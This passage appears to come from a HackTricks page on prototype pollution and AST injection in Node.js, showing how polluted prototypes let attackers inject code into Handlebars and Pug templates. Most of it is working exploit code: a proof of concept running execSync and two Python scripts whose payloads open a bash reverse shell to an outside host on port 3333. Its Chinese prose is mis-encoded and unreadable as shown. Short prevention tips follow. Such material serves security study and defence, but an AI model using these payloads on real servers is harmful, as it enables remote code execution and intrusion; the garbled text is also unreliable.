/* istanbul ignore next: Sanity code */
if (!this[node.type]) {
throw new _exception2['default']('Unknown type: ' + node.type, node);
}

this.sourceNode.unshift(node);
var ret = this[node.type](node);
this.sourceNode.shift();
return ret;
},
Program: function Program(program) {
console.log((new Error).stack)
this.options.blockParams.unshift(program.blockParams);

var body = program.body,
bodyLength = body.length;
for (var i = 0; i < bodyLength; i++) {
this.accept(body[i]);
}

this.options.blockParams.shift();

this.isSimple = bodyLength === 1;
this.blockParams = program.blockParams ? program.blockParams.length : 0;

return this;
}
```
ç¼–è¯‘å™¨å°†ASTå¯¹è±¡ï¼ˆå®é™…ä¸Šæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼‰å‘é€ç»™`accept`æ–¹æ³•ã€‚\
`accept`è°ƒç”¨ç¼–è¯‘å™¨çš„`this[node.type]`ã€‚\
ç„¶åï¼Œä½¿ç”¨ASTçš„`body`å±æ€§æ¥æ„å»ºå‡½æ•°ã€‚
```javascript
const Handlebars = require('handlebars');

Object.prototype.type = 'Program';
Object.prototype.body = [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "console.log(process.mainModule.require('child_process').execSync('id').toString())"
}],
"loc": {
"start": 0,
"end": 0
}
}];


const source = `Hello {{ msg }}`;
const template = Handlebars.precompile(source);

console.log(eval('(' + template + ')')['main'].toString());

/*
function (container, depth0, helpers, partials, data) {
var stack1, lookupProperty = container.lookupProperty || function (parent, propertyName) {
if (Object.prototype.hasOwnProperty.call(parent, propertyName)) {
return parent[propertyName];
}
return undefined
};

return ((stack1 = (lookupProperty(helpers, "undefined") || (depth0 && lookupProperty(depth0, "undefined")) || container.hooks.helperMissing).call(depth0 != null ? depth0 : (container.nullContext || {}), console.log(process.mainModule.require('child_process').execSync('id').toString()), {
"name": "undefined",
"hash": {},
"data": data,
"loc": {
"start": 0,
"end": 0
}
})) != null ? stack1 : "");
}
*/
```
ä½œä¸ºç»“æœï¼Œå¯ä»¥é…ç½®å¦‚ä¸‹çš„æ”»å‡»ã€‚å¦‚æœä½ å·²ç»é€šè¿‡è§£æå™¨ï¼ŒæŒ‡å®šä¸€ä¸ªä¸èƒ½è¢«èµ‹å€¼ç»™NumberLiteralå€¼çš„å­—ç¬¦ä¸²ã€‚ä½†æ˜¯æ³¨å…¥çš„ASTè¢«å¤„ç†åï¼Œæˆ‘ä»¬å¯ä»¥å°†ä»»ä½•ä»£ç æ’å…¥åˆ°å‡½æ•°ä¸­ã€‚

**ç¤ºä¾‹**

[https://github.com/hughsk/flat/issues/105](https://github.com/hughsk/flat/issues/105)
```python
import requests

TARGET_URL = 'http://p6.is:3000'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.type": "Program",
"__proto__.body": [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}],
"loc": {
"start": 0,
"end": 0
}
}]
})

# execute
requests.get(TARGET_URL)
```
### Pug

æ›´å¤šä¿¡æ¯è¯·å‚è€ƒ[https://blog.p6.is/AST-Injection/#Pug](https://blog.p6.is/AST-Injection/#Pug)
```python
import requests

TARGET_URL = 'http://p6.is:3000'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.block": {
"type": "Text",
"line": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}
})

# execute
requests.get(TARGET_URL)
```
## æˆ‘å¯ä»¥åšä»€ä¹ˆæ¥é¢„é˜²ï¼Ÿ

* ä½¿ç”¨ `Object.freeze (Object.prototype)` å†»ç»“å±æ€§
* æ ¹æ®åº”ç”¨ç¨‹åºçš„æ¨¡å¼å¯¹ JSON è¾“å…¥è¿›è¡ŒéªŒè¯
* é¿å…ä»¥ä¸å®‰å…¨çš„æ–¹å¼ä½¿ç”¨é€’å½’åˆå¹¶å‡½æ•°
* ä½¿ç”¨æ²¡æœ‰åŸå‹å±æ€§çš„å¯¹è±¡ï¼Œä¾‹å¦‚ `Object.create(null)`ï¼Œä»¥é¿å…å½±å“åŸå‹é“¾
* ä½¿ç”¨ `Map` è€Œä¸æ˜¯ `Object`
* å®šæœŸæ›´æ–°åº“çš„æ–°è¡¥ä¸

## å‚è€ƒèµ„æ–™

* [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
* [https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l](https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l)
* [https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks äº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶ **ç½‘ç»œå®‰å…¨å…¬å¸** å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨ HackTricks ä¸­ **å®£ä¼ ä½ çš„å…¬å¸** å—ï¼Ÿæˆ–è€…æƒ³è¦è·å¾— **PEASS çš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½ HackTricks çš„ PDF** å—ï¼Ÿè¯·æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶ [**NFTs**](https://opensea.io/collection/the-peass-family) é›†åˆ [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å– [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…åœ¨ **Twitter** ä¸Š **å…³æ³¨** æˆ‘ [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘** [**hacktricks ä»“åº“**](https://github.com/carlospolop/hacktricks) **å’Œ** [**hacktricks-cloud ä»“åº“**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤ PR æ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
